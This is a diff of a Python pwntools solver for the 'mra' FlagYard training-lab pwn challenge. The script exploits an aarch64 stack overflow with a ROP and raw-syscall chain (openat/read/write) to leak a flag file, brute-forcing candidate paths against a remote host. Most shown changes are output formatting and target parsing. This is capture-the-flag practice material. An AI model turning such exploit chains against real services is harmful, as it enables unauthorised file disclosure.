@@ -1,15 +1,30 @@
 #!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 """
-mra  -  FlagYard aarch64 pwn exploit (colored edition)
-Architecture: aarch64, ROP + raw syscall chain via form-fill stack overflow.
+MRA  -  FlagYard Pwn solver
+
+mra (FlagYard Training Labs, Pwn / SAFCSP) - aarch64 binary with a form-fill
+stack overflow. ROP + raw syscall chain:
+
+    openat(AT_FDCWD, path, 0)  ->  read(fd=3, buf, 0x100)  ->  write(1, buf)
+
+The write leaks whichever flag file path is opened; a small candidate list is
+bruted so it runs on any instance.
+
+Target is given as host:port (default tcp.flagyard.com:21290).
 """
+from __future__ import annotations
+
 from pwn import *
-import os, sys, time
+import re
+import sys
+import time
+from pathlib import Path
 
 context.arch = 'aarch64'
 
 # ---------------------------------------------------------------------------
-# colored output (same design as the NOSJ solver)
+# coloured output (same design as the other FlagYard solvers)
 # ---------------------------------------------------------------------------
 class C:
     RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
@@ -18,7 +33,7 @@ class C:
     WHITE = "\033[97m"
 
 def enable_vt():
-    if os.name == "nt":
+    if sys.platform == "win32":
         try:
             import ctypes
             k32 = ctypes.windll.kernel32
@@ -30,23 +45,30 @@ def enable_vt():
             pass
     try:
         sys.stdout.reconfigure(encoding="utf-8", errors="replace")
-        sys.stdin.reconfigure(encoding="utf-8", errors="replace")
     except Exception:
         pass
 
-def bar(frac, width=20):
-    filled = int(frac * width)
-    return "\u2588" * filled + "\u2591" * (width - filled)
+def bar(frac):
+    w = 20
+    f = max(0.0, min(1.0, frac))
+    full = int(round(f * w))
+    return "[%s%s] %5.1f%%" % ("\u2588" * full, "\u2591" * (w - full), f * 100.0)
 
-def pct(frac):
-    return "[%5.1f%%]" % (frac * 100.0)
+def step(msg, icon="\u25b6", color=C.CYAN):
+    print("  %s%s %s%s%s" % (C.BOLD + color + icon + " ",
+                             C.DIM, C.BOLD, msg, C.RESET), flush=True)
 
-def status(frac, msg, icon="\u25b6", color=C.CYAN):
-    print("  %s%s %s%s%s %s%s%s" % (C.DIM, pct(frac), C.BOLD + color + icon + " ",
-                                    C.RESET, C.DIM, C.BOLD, msg, C.RESET), flush=True)
+def ok(msg):
+    step(msg, icon="\u2713", color=C.GREEN)
 
-def ok(frac, msg):
-    status(frac, msg, icon="\u2713", color=C.GREEN)
+def tick(frac, msg):
+    """single moving progress line (updates in place via carriage return)."""
+    line = ("%s%s %s %s%s%s" %
+            (C.BOLD + C.YELLOW + "\u25b6 ",
+             C.CYAN + bar(frac) + C.RESET,
+             C.DIM, C.BOLD, msg, C.RESET))
+    sys.stdout.write("\r  " + line + "   ")
+    sys.stdout.flush()
 
 def fail(msg):
     print("  %s\u2717 %s%s%s" % (C.RED, C.BOLD, msg, C.RESET), flush=True)
@@ -54,12 +76,16 @@ def fail(msg):
 def banner():
     print(C.MAGENTA + C.BOLD)
     print("  " + "\u2554" + "\u2550" * 58 + "\u2557")
-    print("  \u2551          M R A   E X P L O I T            \u2551")
-    print("  \u2551   aarch64 ROP syscall chain  |  Pwn        \u2551")
+    for t in ("M R A   S O L V E R",
+              "aarch64 ROP -> openat/read/write -> flag"):
+        l = (58 - len(t)) // 2
+        print("  \u2551" + " " * l + t + " " * (58 - len(t) - l) + "\u2551")
     print("  \u255a" + "\u2550" * 58 + "\u255d")
     print(C.RESET)
 
+# ---------------------------------------------------------------------------
 # result panel (fixed-width frame) + author credits
+# ---------------------------------------------------------------------------
 W = 58
 _TG = "\033[1;38;2;0;136;204m"
 _OSC_END = "\x1b]8;;\x1b\\"
@@ -94,21 +120,41 @@ def _credits():
           ("credly.com/users/faresbadaj", _osc("https://www.credly.com/users/faresbadaj", "\033[1;33m"), _OSC_END)])
     print("  " + "\u255a" + "\u2550" * W + "\u255d")
 
-def big_flag(text, path, chrono):
-    line = text.strip().splitlines()[0]
+def big_flag(flag, chrono):
     print()
-    head = "\u2605  FLAG CAPTURED  \u2605"
+    head = "\u2605  FLAG RECOVERED  \u2605"
     print("  " + "\u2554" + "\u2550" * W + "\u2557")
     _row([("", "", "")])
     _row([(" " * ((W - len(head)) // 2), "", ""), (head, C.BOLD + C.YELLOW, "")])
     _row([("", "", "")])
-    _row([(" " * 6, "", ""), (line, C.BOLD + C.GREEN, "")])
-    for s in ("elapsed %.1f s" % chrono,
-              "file = %s" % path.rsplit(b"\x00", 1)[0].decode()):
-        _row([(" " * 10, "", ""), (s, C.DIM + C.CYAN, "")])
+    _row([(" " * 6, "", ""), (flag, C.BOLD + C.GREEN, "")])
+    _row([(" " * 10, "", ""), ("elapsed %.1f s" % chrono, C.DIM + C.CYAN, "")])
     _row([("", "", "")])
     _credits()
     print()
+
+# ---------------------------------------------------------------------------
+# helpers
+# ---------------------------------------------------------------------------
+def ask_target(argv):
+    if len(argv) > 1 and (argv[1].startswith("http") or ":" in argv[1]):
+        return argv[1].strip()
+    raw = input("  Enter the MRA challenge target (host:port): ").strip()
+    return raw or "tcp.flagyard.com:21290"
+
+def parse_target(raw):
+    raw = raw.replace("tcp://", "").replace("http://", "").rstrip("/")
+    if ":" in raw:
+        host, port_s = raw.rsplit(":", 1)
+    else:
+        host, port_s = raw, "21290"
+    return host, int(port_s)
+
+def read_flag(raw):
+    if isinstance(raw, bytes):
+        raw = raw.decode("utf-8", "replace")
+    m = re.search(r"(FlagY\{[^}]+\})", raw)
+    return m.group(1) if m else None
 
 # ---------------------------------------------------------------------------
 # gadgets / constants
@@ -214,49 +260,44 @@ def try_flag_path(host, port, path):
     return out
 
 
-# ---------------------------------------------------------------------------
-# main
-# ---------------------------------------------------------------------------
-def main():
+def main() -> None:
+    t0 = time.time()
     enable_vt()
     banner()
     context.log_level = 'error'
 
-    raw = input("  Target (host:port) > ").strip() or "tcp.flagyard.com:21290"
-    raw = raw.replace("tcp://", "").replace("http://", "")
-    if ":" in raw:
-        host, port_s = raw.rsplit(":", 1)
-    else:
-        host, port_s = raw, "21290"
-    port = int(port_s)
-    print("  %s[ target : %s%s:%d%s ]%s\n" % (C.GRAY, C.CYAN, host, port, C.RESET, C.RESET))
-    t0 = time.time()
+    try:
+        raw = ask_target(sys.argv)
+    except Exception:
+        fail("no challenge target given")
+        return
+    host, port = parse_target(raw)
+    step("target host %s:%d" % (host, port))
 
     total = len(CANDIDATES)
-    start = 0.10
     for i, path in enumerate(CANDIDATES):
-        frac = start + (1.0 - start) * ((i + 1) / total)
-        status(frac, "Trying file %s%s%s  (path %d/%d)" %
-               (C.YELLOW, path.rsplit(b'\x00', 1)[0].decode(), C.RESET, i + 1, total),
-               icon="\u25b6", color=C.CYAN)
+        step("openat(%s) + read + write  (path %d/%d)" %
+             (path.rsplit(b'\x00', 1)[0].decode(), i + 1, total))
         try:
             out = try_flag_path(host, port, path)
         except Exception as e:
             fail("connection/exploit error: %s" % (e,))
             continue
 
-        line = ("  %s  %s%5.1f%%%s %s %s%d bytes%s%s  file=%-18s%s" %
-                (bar(frac, 20), C.CYAN, frac * 100.0, C.DIM, C.GRAY, C.GREEN, len(out),
-                 C.GRAY, C.DIM, path.rsplit(b'\x00', 1)[0].decode(), C.RESET))
-        sys.stdout.write("\r" + line + "   ")
-        flags = [l for l in out.splitlines() if b'flag' in l.lower()]
-        if flags:
+        flag = read_flag(out)
+        if flag:
+            tick(0.85, "flag leaked via openat/read/write chain")
             print()
-            ok(min(frac, 0.99), "openat(%s) + read + write: flag leaked!" % path.rsplit(b'\x00', 1)[0].decode())
-            big_flag(flags[0].decode(errors="replace"), path, time.time() - t0)
+            ok("FLAG = %s" % flag)
+
+            big_flag(flag, time.time() - t0)
+            outp = Path(__file__).resolve().parent / "flag_from_mra.txt"
+            outp.write_text(flag + "\n", encoding="utf-8")
+            print("  %s[+] saved to %s%s" % (C.GREEN, outp, C.RESET))
             return
-        print()
-        ok(frac, "tried %-16s got %d bytes (no flag)" % (path.rsplit(b'\x00', 1)[0].decode(), len(out)))
+
+        ok("tried %-16s got %d bytes (no flag)" %
+           (path.rsplit(b'\x00', 1)[0].decode(), len(out)))
 
     fail("no flag in the candidate list \u2014 try other paths or a fresh instance.")
 
